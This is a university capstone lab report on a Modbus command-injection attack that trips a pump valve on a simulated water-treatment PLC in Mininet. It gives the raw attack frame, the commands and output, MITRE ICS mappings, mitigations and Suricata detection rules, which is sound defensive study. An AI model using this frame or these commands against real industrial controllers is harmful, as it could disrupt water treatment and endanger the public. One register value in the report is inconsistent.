# Scenario 2 — Modbus Command Injection (Pump Valve Trip)

**Testbed:** Goulburn WTP — AquaOps Utilities (UTS 31261 Internetworking Capstone) | **Date:** 2026-04-14 | **Owner:** Bailey Taylor and Shahhin Sarlak
**Platform:** Ubuntu 24.04 LTS | Mininet 2.3 | pymodbus 3.12.1 | mbpoll 1.4.11
**Attacker:** ews01 (EWS-01, 10.0.0.1) | **Target:** plc1 (PLC-PUMP1, 10.0.0.2, port 5502)

---

## 1. What the attack does at the protocol level

This attack uses **FC05 Write Single Coil** to flip a digital output on the PLC — specifically coil 0 (tag: pump1-valve.closed) from True (CLOSED) to False (OPEN).

In a real water treatment plant, "CLOSED" means the pump inlet valve is energised and flow is normal. Writing False to that coil sends a TRIP command that de-energises the valve, interrupting pump flow and halting chemical dosing on that line.

Modbus TCP has no authentication, no session layer, no command signing. Any host that can reach port 5502 can issue a write command that is indistinguishable to the PLC from a legitimate SCADA command. The PLC acts on it immediately.

The raw Modbus TCP frame for this attack is 12 bytes:

```
00 01 00 00 00 06 01 05 00 00 00 00
```

Broken down:

| Field | Bytes | Value | Meaning |
|---|---|---|---|
| Transaction ID | 00 01 | 1 | Matches request to response |
| Protocol ID | 00 00 | 0 | Always 0 for Modbus |
| Length | 00 06 | 6 | 6 bytes follow |
| Unit ID | 01 | 1 | PLC device address |
| Function Code | 05 | 5 | FC5 Write Single Coil |
| Coil Address | 00 00 | 0 | Coil 0 (pump1-valve.closed) |
| Coil Value | 00 00 | 0x0000 | OPEN (0xFF00 = CLOSED) |

The response from the PLC echoes the request — same function code, same address, same value. No error. The pump inlet valve is now open (de-energised).

---

## 2. MITRE ATT&CK for ICS mapping

| Tactic | Technique | ID |
|---|---|---|
| Impair Process Control | Unauthorized Command Message | T0855 |
| Impair Process Control | Modify Control Logic | T0833 |
| Impact | Loss of Control | T0827 |
| Impact | Loss of View | T0829 |

This is the canonical ICS attack path: reconnaissance (T0861) feeds into an unauthorized command (T0855) that causes loss of control (T0827). Ukraine 2015 BlackEnergy attacks followed this exact sequence against Modbus-based substation RTUs. For water treatment context: Oldsmar Florida 2021 — attacker modified chemical dosing setpoints via SCADA, analogous protocol-layer vulnerability.

---

## 3. Exact commands run

**Baseline read before attack (from ews01):**

```
mbpoll -1 -a 1 -t 4 -r 30001 -c 1 10.0.0.2 -p 5502
```

Output: `[30001]: 300`

**Attack run (from ews01):**

```
python3 attacks/scenario2_command_injection.py --target 10.0.0.2 --port 5502
```

Executed 2026-04-14T16:33:39.053. Output (abbreviated):

```
[+] Connected to 10.0.0.2:5502

[*] Pre-attack state:
  Coil 0  (pump1-valve.closed): True  (CLOSED -- valve energised, flow normal)
  Coil 1  (pump2-valve.closed): True  (CLOSED -- valve energised, flow normal)
  HR 30000 (pump1-flow.Lps):     300
  HR 30001 (pump2-flow.Lps):     185

[!] Sending FC5 Write Coil 0 = False (OPEN) at 2026-04-14T16:33:39.053

[*] Post-attack state:
  Coil 0  (pump1-valve.closed): False (OPEN  -- valve de-energised, flow interrupted)
  Coil 1  (pump2-valve.closed): True  (CLOSED -- valve energised, flow normal)
  HR 30000 (pump1-flow.Lps):     300
  HR 30001 (pump2-flow.Lps):     185

  *** ATTACK SUCCESSFUL ***
  pump1-valve tripped OPEN -- pump inlet valve de-energised,
  flow on pump1 line interrupted.
  In a real water treatment plant this would halt disinfection
  dosing and could allow untreated water into the supply network.
```

**Confirmation read after attack:**

```
mbpoll -1 -a 1 -t 4 -r 30001 -c 1 10.0.0.2 -p 5502
```

Output: `[30001]: 300`

**Coil reset:**

```
python3 -c "from pymodbus.client import ModbusTcpClient; ..."
```

Output: `Coil 0 reset to CLOSED, result: WriteSingleCoilResponse(...status=1...)`

---

## 4. Before and after register values

| Tag | Address | Before | After |
|---|---|---|---|
| pump1-valve.closed | Coil 0 | True (CLOSED) | **False (OPEN)** |
| pump2-valve.closed | Coil 1 | True (CLOSED) | True (CLOSED) |
| pump1-flow.Lps | HR 30000 | 300 | 300 |
| pump2-flow.Lps | HR 30001 | 185 | 185 |

Note: the holding registers do not change because the simulated server does not model the physical consequence of a valve trip (which would cause flow readings to drop to zero). In a real PLC with physics modelled, HR 30000 would drop from 300 to 0 Lps following the trip.

---

## 5. What this would mean in a real water treatment plant

Pump 1 delivers 300 litres/sec. Tripping pump1-valve OPEN at peak demand:

- Halts 300 Lps of treated water flow instantaneously. The pump motor continues running but draws water against a closed downstream path, risking cavitation damage.
- Chemical dosing on the pump1 line stops immediately. If the plant relies on pump1 for chlorine injection, treated water entering the distribution network may be under-dosed.
- scada01 would see the coil change on its next polling cycle (typically 1-4 seconds). An alarm fires, but the valve is already open and flow is already interrupted.
- Recovery requires an operator to re-issue a CLOSE command and verify the valve physically actuated. If the PLC logged the trip source as a legitimate SCADA command (which it would — Modbus provides no source authentication), root-cause analysis is significantly harder.
- Real-world precedent: Oldsmar Florida 2021 — attacker raised NaOH (lye) concentration 111× via SCADA. Operator caught it in time. The protocol-layer vulnerability is identical to this scenario.

The attacker did not need physical access, insider knowledge, or any credentials. The only requirement was network access to port 5502 — something achievable from a compromised engineer workstation if IT/OT segmentation is absent.

---

## 6. Recommended mitigations

1. **Whitelist only legitimate SCADA IPs for write function codes.** Configure a Modbus firewall or ACL to permit FC05, FC06, FC15, FC16 only from the SCADA server (scada01, 10.0.1.1 in this topology). Block all write-capable function codes from any other source, including engineer workstation IPs unless explicitly whitelisted. This is the single most effective control: it does not require changes to the PLC or SCADA software. The `mitigation2_fc_filter.py` proxy in this testbed implements this approach.

2. **Enable write logging and alerting on the SCADA/Historian.** The PLC does not log writes internally. But hist01 (10.0.1.2) should mirror all Modbus traffic. Configure an alert when a coil write originates from a non-SCADA source, or when pump1-valve or pump2-valve changes state outside an expected maintenance window. State changes outside business hours or without a corresponding operator action in the SCADA audit log should be treated as potential injection.

3. **Deploy Modbus read-back verification in the SCADA application.** After any operator-initiated coil write, the SCADA should immediately re-read the coil and compare to the intended value. If an attacker writes a value between the operator's read and write cycles, the re-read will detect the discrepancy. This "command echo" pattern is common in safety-instrumented systems and can be retrofitted to existing SCADA configurations without PLC changes.

---

## 7. Detection opportunities

**Suricata rule — FC05 Write Single Coil from non-SCADA host:**

```
alert tcp !10.0.1.1 any -> 10.0.0.2 5502 (
  msg:"MODBUS FC05 Write Coil - Unauthorized Source";
  flow:to_server,established;
  byte_test:1,=,5,7;
  sid:9000010; rev:1;
)
```

**Suricata rule — detect coil OPEN value (0x0000):**

```
alert tcp any any -> 10.0.0.2 5502 (
  msg:"MODBUS FC05 Write Coil OPEN - Possible Trip Command";
  flow:to_server,established;
  content:"|05 00 00 00 00|";
  offset:7; depth:5;
  sid:9000011; rev:1;
)
```

**SCADA alert:** Any coil state change on coil 0 or 1 (pump1-valve.closed, pump2-valve.closed) should generate a Priority 1 operator notification. If the change was not initiated from the SCADA console, automatically log the source IP from the Modbus TCP session.

---

## 8. Issues encountered during execution

- The initial `plc1.cmd("python3 server.py &")` approach in the runner did not reliably background the server process in Mininet's process namespace. The server exited when the cmd pipe closed, leaving port 5502 unbound. Fixed by switching to `plc1.popen()` which spawns a proper subprocess in plc1's network namespace without blocking.
- pymodbus 3.12 uses `device_id=1` instead of `slave=1` in all client calls. All three attack scripts were updated before the final run.
- The holding register reads after the coil write show the same values (300, 185 Lps) because the simulated Modbus server does not model physical consequences. This is a limitation of the testbed, not the attack.
- Attack completed successfully on the first attempt after API fixes. Total time from connect to confirmed state change: under 1 second.
